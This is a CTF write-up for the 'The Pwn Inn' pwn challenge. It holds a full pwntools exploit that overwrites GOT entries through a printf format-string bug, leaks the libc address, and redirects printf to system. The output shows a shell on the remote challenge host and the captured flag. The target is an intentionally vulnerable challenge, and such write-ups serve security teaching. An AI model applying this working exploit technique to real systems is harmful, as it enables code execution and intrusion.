## The Pwn Inn

```
480

As we know that crypto is a hot potato right now, we wanted to welcome you to a safe place, The Pwn Inn. We've had many famous faces stay in our Inn, with gets() and printf() rating us 5 stars. We've decided to start making an app, and wanted you guys to be our beta testers! Welcome!

EU instance: 161.97.176.150 2626

US instance: 185.172.165.118 2626

author: Tango
```

Tags: _pwn_ _x86-64_ _format-string_ _got-overwrite_

Exploit:

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./the_pwn_inn')
libc = binary.libc

if args.REMOTE:
	p = remote('185.172.165.118', 2626)
else:
	p = process(binary.path)

offset = 6
payload = fmtstr_payload(offset,{binary.got.exit:binary.sym.vuln})

# inf. free rides
p.sendlineafter('name? \n',payload)
null = payload.find(b'\x00')
log.info('null loc: ' + str(null))
p.recvuntil(payload[null-2:null])

# 2nd pass leak libc
# 0x00007fff902f5278│+0x0038: 0x00007eff1381aebf  →  <printf+175> mov rcx, QWORD PTR [rsp+0x18]
payload = b'%13$p'
p.sendline(payload)
p.recvuntil('Welcome ')
printf_175 = int(p.recvline().strip(),16)
libc.address = printf_175 - libc.sym.printf - 175
log.info('libc.address: ' + hex(libc.address))

payload = fmtstr_payload(offset,{binary.got.printf:libc.sym.system})

p.sendline(payload)
null = payload.find(b'\x00')
log.info('null loc: ' + str(null))
p.recvuntil(payload[null-2:null])
p.interactive()
```

Output:

```bash
# ./exploit.py REMOTE=1
[*] '/pwd/datajerk/0x41414141ctf2021/the_pwn_inn/the_pwn_inn'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to 185.172.165.118 on port 2626: Done
[*] '/usr/lib/x86_64-linux-gnu/libc-2.31.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] null loc: 43
[*] libc.address: 0x7f783f002000
[*] null loc: 59
[*] Switching to interactive mode
$ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
$ cat flag.txt
flag{GOTt4_b3_OVERWRITEing_th0s3_symb0ls_742837423}
```
